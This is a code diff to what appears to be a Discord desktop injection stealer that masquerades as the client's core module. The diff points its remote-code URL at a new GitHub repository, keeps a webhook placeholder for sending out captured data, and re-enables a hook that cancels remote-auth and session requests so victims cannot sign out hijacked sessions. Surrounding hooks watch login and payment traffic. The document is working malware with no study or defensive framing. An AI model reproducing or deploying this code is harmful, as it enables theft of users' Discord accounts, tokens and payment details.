@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%hooko%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/mertcuan/lalaranqwrb/main/discord_desktop_core/discord_injection.js",
     filters: {
         urls: [
             '/auth/login',
@@ -619,12 +619,12 @@ session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (det
     }
 });
 
-//session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
-    //if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
+session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
+    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
         cancel: true
-    //});
+    });
 
     updateCheck()
-//});
+});
 
 module.exports = require("./core.asar");
